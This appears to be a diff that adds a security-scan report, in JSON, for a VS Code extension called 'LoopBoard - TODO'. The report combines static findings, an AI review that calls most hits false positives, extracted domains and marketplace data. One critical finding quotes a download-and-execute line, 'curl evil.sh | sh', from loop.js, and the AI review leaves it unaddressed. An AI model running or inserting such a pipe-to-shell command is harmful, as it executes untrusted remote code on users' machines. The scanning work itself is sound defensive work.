@@ -1,0 +1,256 @@
+{
+  "extension_id": "SinnConsulting.loopboard-todo",
+  "display_name": "LoopBoard - TODO",
+  "version": "3.7.1",
+  "publisher": {
+    "name": "SinnConsulting",
+    "verified": false
+  },
+  "vsix_sha256": "b96818ef38feed54155f9e8fd04b15824c9c6f097e44db050798787f898f40d6",
+  "verdict": "SUSPICIOUS",
+  "confirmation_basis": [
+    "critical_static_finding"
+  ],
+  "confidence": 0.6,
+  "scores": {
+    "composite": 0.2796122243717454,
+    "ai_vibe": 0.1,
+    "static": 0.5584488974869815,
+    "behavioral": 0.0,
+    "trust_signal": 0.7,
+    "campaign": 0.0
+  },
+  "findings": {
+    "critical": [
+      {
+        "check": "lolbins_stagers",
+        "severity": "CRITICAL",
+        "description": "Curl piped to shell (download-and-execute)",
+        "file": "extension/out/loop.js",
+        "line": 15,
+        "snippet": "curl evil.sh | sh"
+      }
+    ],
+    "high": [
+      {
+        "check": "data_exfiltration",
+        "severity": "HIGH",
+        "description": "Pattern suggesting data exfiltration",
+        "file": "extension/media/sidebar.js",
+        "line": 218,
+        "snippet": ".postMessage({ type: 'reveal', phase: p.key"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Setting file hidden attribute",
+        "file": "extension/media/board.js",
+        "line": 1769,
+        "snippet": ".hidden"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Setting file hidden attribute",
+        "file": "extension/media/board.js",
+        "line": 1865,
+        "snippet": ".hidden"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Setting file hidden attribute",
+        "file": "extension/media/board.js",
+        "line": 1921,
+        "snippet": ".hidden"
+      }
+    ],
+    "total": 21
+  },
+  "extracted_references": [
+    {
+      "type": "domain",
+      "value": "loopboard.delegatework.review",
+      "source_file": "extension/package.json",
+      "line": 217,
+      "context": "\"markdownDescription\": \"Off (default): each loop grooms through a subagent (Rule 14 in `LOOP.md`) but implements tasks inline in its own session. On: the loop also delegates every code-editing step \u2014 ",
+      "vt_detections": 0,
+      "reputation": "unknown"
+    },
+    {
+      "type": "domain",
+      "value": "delegatework.review",
+      "source_file": "extension/out/extension.js",
+      "line": 77,
+      "context": "delegateReview: c.get('delegateWork.review', true),",
+      "vt_detections": 0,
+      "reputation": "unknown"
+    }
+  ],
+  "extracted_references_notes": {
+    "withheld_dependency_metadata": 0,
+    "truncated": 0,
+    "what_this_is": "Domains, URLs and filenames found in the package text. NOT confirmed attacker infrastructure and NOT safe to auto-blocklist -- a URL in a code comment appears here too. Use it as a starting point for analysis, and check vt_detections/reputation before acting.",
+    "rule": "References extracted from node_modules are excluded: they describe a dependency, not this extension. Deduplicated on (type, value)."
+  },
+  "ioc_enrichment": [],
+  "shared_infrastructure": {},
+  "ai_analysis": {
+    "verdict": "CLEAN",
+    "risk_score": 0.1,
+    "confidence": 0.95,
+    "blocks_parsed": 7,
+    "blocks_seen": 9,
+    "summaries": [
+      {
+        "target": "extension/out/terminals.js",
+        "summary": "The code is a benign implementation of a VS Code extension that manages integrated terminals to run the Claude Code CLI. It uses standard VS Code APIs (`vscode.window.createTerminal`, `terminal.sendText`) to spawn and control these terminals. The flagged 'shell command' activity is the intended feature of the extension, not a vulnerability. Input validation and escaping are present, mitigating injection risks from user-configured settings. No malicious patterns, credential harvesting, or network exfiltration were detected."
+      },
+      {
+        "target": "extension/media/sidebar.js",
+        "summary": "The provided source code is a benign vanilla JavaScript implementation of a VS Code Webview sidebar for the 'LoopBoard' extension. It handles UI rendering, user interactions (clicks, context menus for scheduling), and communication with the extension host via the standard `vscode.postMessage` API. There are no network calls, no file system access, no child process execution, and no obfuscation. The code aligns perfectly with the extension's stated purpose of providing a UI for managing AI coding loops. The static scanner hit regarding 'data exfiltration' is a false positive triggered by the standard VS Code webview messaging API."
+      },
+      {
+        "target": "extension/media/board.js (chunk 1/5)",
+        "summary": "The provided source code is a standard VS Code webview script implementing a Kanban board UI. It uses vanilla JavaScript for DOM manipulation, state management, and communication with the extension host via `vscode.postMessage`. The code contains no network calls, no file system access outside the webview context, no credential harvesting, and no execution of arbitrary commands. The static scanner hits regarding 'persistence_evasion' are false positives triggered by the generic DOM attribute setter handling the HTML `hidden` attribute. The code is benign and consistent with the extension's stated purpose."
+      },
+      {
+        "target": "extension/media/board.js (chunk 2/5)",
+        "summary": "The provided source code is a benign UI component for a VS Code extension named 'LoopBoard'. It handles rendering task cards, managing edit states, and communicating with the extension host via `postMessage`. The static scanner's 'persistence_evasion' alerts are false positives, likely triggered by DOM property accesses or CSS class names rather than actual file system manipulation. The code exhibits no malicious behavior, credential harvesting, or unauthorized network activity."
+      },
+      {
+        "target": "extension/media/board.js (chunk 3/5)",
+        "summary": "The provided code chunk is a benign UI rendering module for a VS Code extension named 'LoopBoard'. It handles the visual representation of task cards, including drag-and-drop file attachments, markdown rendering, and state management (collapse/expand). The static analysis hits regarding 'persistence_evasion' are false positives triggered by the use of the string 'hidden' in CSS class names or DOM visibility logic, not file system operations. The code does not exhibit any malicious behavior such as credential harvesting, C2 communication, or arbitrary code execution."
+      },
+      {
+        "target": "extension/media/board.js (chunk 4/5)",
+        "summary": "The provided code is a standard frontend JavaScript module for a VS Code extension webview (LoopBoard). It implements UI rendering logic for task descriptions, questions, reviews, and notes using DOM manipulation. The code handles user input, form submissions, and local state management within the webview context. There are no network calls, file system operations, child process executions, or credential harvesting attempts. The static scanner hits regarding '.hidden' are false positives triggered by standard DOM visibility toggles. The code aligns perfectly with the stated purpose of providing a UI for Claude Code loops."
+      },
+      {
+        "target": "extension/media/board.js (chunk 5/5)",
+        "summary": "The provided source code is a benign UI rendering script for a VS Code Webview. It handles DOM manipulation, event listeners for user interaction (clicks, keydowns), and message passing between the webview and the extension host. The static analysis hits regarding 'persistence_evasion' are false positives triggered by the substring '.hidden', which is likely part of CSS styling or UI state management rather than malicious file attribute manipulation. The code aligns with the stated purpose of a 'LoopBoard' UI for Claude Code loops."
+      }
+    ],
+    "findings": [
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static scanner flagged `terminal.sendText` as potential shell command injection. However, this is the core functionality of the extension: it manages VS Code integrated terminals to run the 'Claude Code' CLI. The code explicitly validates inputs (`isKnownModel`, `isValidModelString`, `isValidPermissionMode`) before constructing the command string, and properly escapes single quotes in the injected prompt (`cmd.replace(/'/g, `'\\''`)`). This is standard behavior for a terminal management extension, not malicious.",
+        "code_reference": "terminal.sendText(`${base} '${cmd.replace(/'/g, `'\\''`)}'`);",
+        "line_hint": "197",
+        "target": "extension/out/terminals.js"
+      },
+      {
+        "severity": "LOW",
+        "category": "BEHAVIORAL_ALIGNMENT",
+        "description": "The extension's purpose is to provide a UI for 'Claude Code loops'. The code creates terminals, sends specific CLI commands (`claude ...`), and manages their lifecycle. This is perfectly proportional to the advertised function. No unrelated capabilities (like file exfiltration, keylogging, or network tunneling) are present.",
+        "code_reference": null,
+        "line_hint": null,
+        "target": "extension/out/terminals.js"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static rule engine flagged `postMessage({ type: 'reveal', ... })` as potential data exfiltration. This is a false positive. In VS Code Webviews, `vscode.postMessage` is the standard, secure API for sending messages from the webview script to the extension host (the extension's main process). It does not send data over the network. The payload contains UI state (phase keys, search filters) which is expected for a Kanban-style board interface.",
+        "code_reference": "vscode.postMessage({ type: 'reveal', phase: r.phase, search: r.search })",
+        "line_hint": "approx. line 218",
+        "target": "extension/media/sidebar.js"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "Static scanner flagged 'persistence_evasion' due to `.hidden` attribute usage. In the provided source code, this corresponds to standard DOM manipulation (e.g., `e.setAttribute(k, v === true ? '' : v)` where `k` could be 'hidden'). This is benign UI logic for hiding elements, not file system attribute manipulation.",
+        "code_reference": "else e.setAttribute(k, v === true ? '' : v);",
+        "line_hint": "17",
+        "target": "extension/media/board.js (chunk 1/5)"
+      },
+      {
+        "severity": "LOW",
+        "category": "BEHAVIORAL_ALIGNMENT",
+        "description": "The code implements a complex Kanban-style board UI with state management, search, and optimistic updates. This aligns perfectly with the extension's description as a 'UI for Claude Code loops' and 'TODO.md as a live board'. No capability disconnect detected.",
+        "code_reference": null,
+        "line_hint": null,
+        "target": "extension/media/board.js (chunk 1/5)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static rule engine flagged 'persistence_evasion' due to `.hidden` matches. However, inspection of the provided source code reveals no file system operations, no `fs.chmod`, no `fs.stat`, and no logic setting file attributes. The `.hidden` matches likely refer to CSS class names (e.g., `class: 'sr-only'` or similar visibility toggles) or DOM element properties (e.g., `element.hidden = true`) used for UI state management, which is standard behavior for a Kanban-style board UI. There is no evidence of malicious persistence mechanisms.",
+        "code_reference": "N/A (False positive from scanner)",
+        "line_hint": null,
+        "target": "extension/media/board.js (chunk 2/5)"
+      },
+      {
+        "severity": "LOW",
+        "category": "BEHAVIORAL_ALIGNMENT",
+        "description": "The code implements a complex UI for a task board ('LoopBoard') with features like drag-and-drop attachments, markdown rendering, and state persistence via `postMessage` to the extension host. The use of `navigator.clipboard.writeText` is for copying task IDs, which is benign. The `postMessage` calls send structured data (task IDs, actions, base64 attachments) to the extension host, which is the standard VS Code webview communication pattern. No direct network calls or credential harvesting are present in this chunk.",
+        "code_reference": "function renderCard, function renderDraft, post({ type: 'createDraft' ... })",
+        "line_hint": null,
+        "target": "extension/media/board.js (chunk 2/5)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static rule engine flagged `.hidden` as a persistence evasion technique. However, in this context, `.hidden` is used as a CSS class name (e.g., `card.classList.add('drag-over')`, `class: 'collapsed'`, `class: 'hidden'` implied by visibility logic) or DOM property access for UI state management (collapse/expand states). It is not related to file system attributes or registry keys.",
+        "code_reference": "if (isCollapsedCard) cls += ' collapsed';",
+        "line_hint": "1769 (approximate based on rule hit)",
+        "target": "extension/media/board.js (chunk 3/5)"
+      },
+      {
+        "severity": "LOW",
+        "category": "BEHAVIORAL_ALIGNMENT",
+        "description": "The code implements a Kanban-style board UI for managing tasks (promote, demote, accept, delete). It handles file attachments via drag-and-drop and paste, encoding them as Base64 for transmission to the host extension. This aligns with the 'LoopBoard' description of being a UI for Claude Code loops. No network exfiltration or unauthorized command execution is present in this chunk.",
+        "code_reference": "function renderCard(t) { ... }",
+        "line_hint": "null",
+        "target": "extension/media/board.js (chunk 3/5)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE_STATIC_SCAN",
+        "description": "The static scanner flagged `.hidden` property assignments as 'persistence_evasion'. In this context, these are standard DOM API calls (`element.hidden = true/false`) used to toggle the visibility of UI elements (e.g., 're-groom pending' badge, 'held' tags) within the webview. This is benign UI logic, not file system manipulation.",
+        "code_reference": "pendingEl.hidden = !(isNew && t.questions.length > 0 && answered === t.questions.length);",
+        "line_hint": "approx 1769, 1865, 1921",
+        "target": "extension/media/board.js (chunk 4/5)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static rule engine flagged 'persistence_evasion' due to the presence of the string '.hidden'. However, inspection of the provided code chunk reveals no file system operations, no `fs.chmod`, no `fs.utimes`, and no logic setting file attributes. The string '.hidden' likely appears in CSS class names (e.g., `.hidden { display: none; }`) or UI state variables in other chunks, which is benign for a UI extension.",
+        "code_reference": null,
+        "line_hint": null,
+        "target": "extension/media/board.js (chunk 5/5)"
+      },
+      {
+        "severity": "LOW",
+        "category": "BEHAVIORAL_ALIGNMENT",
+        "description": "The code implements standard VS Code Webview UI logic: rendering DOM elements, handling `window.addEventListener('message')` for communication with the extension host, and managing UI state (toasts, modals, search). The `post({ type: 'ready' })` call is standard for signaling webview initialization. No network exfiltration, credential harvesting, or arbitrary command execution is present in this chunk.",
+        "code_reference": "window.addEventListener('message', (event) => { ... });",
+        "line_hint": "approx 100",
+        "target": "extension/media/board.js (chunk 5/5)"
+      }
+    ],
+    "findings_truncated": 0
+  },
+  "ai_summary": "The code is a benign implementation of a VS Code extension that manages integrated terminals to run the Claude Code CLI. It uses standard VS Code APIs (`vscode.window.createTerminal`, `terminal.sendText`) to spawn and control these terminals. The flagged 'shell command' activity is the intended feature of the extension, not a vulnerability. Input validation and escaping are present, mitigating injection risks from user-configured settings. No malicious patterns, credential harvesting, or network exfiltration were detected.",
+  "escalation_reasons": [
+    "1 CRITICAL findings",
+    "4 HIGH findings"
+  ],
+  "virustotal": {
+    "malicious": 0,
+    "total_engines": 0,
+    "known_malicious": false
+  },
+  "marketplace": {
+    "install_count": 29,
+    "published_date": "2026-07-18T16:49:30.123+00:00",
+    "removed_by_microsoft": false,
+    "removal_type": null
+  },
+  "analysis_coverage": {
+    "partial": false,
+    "excluded_phases": [],
+    "ai_phase_ran": true
+  },
+  "scanned_at": "2026-09-15T05:58:13.101341+00:00Z"
+}
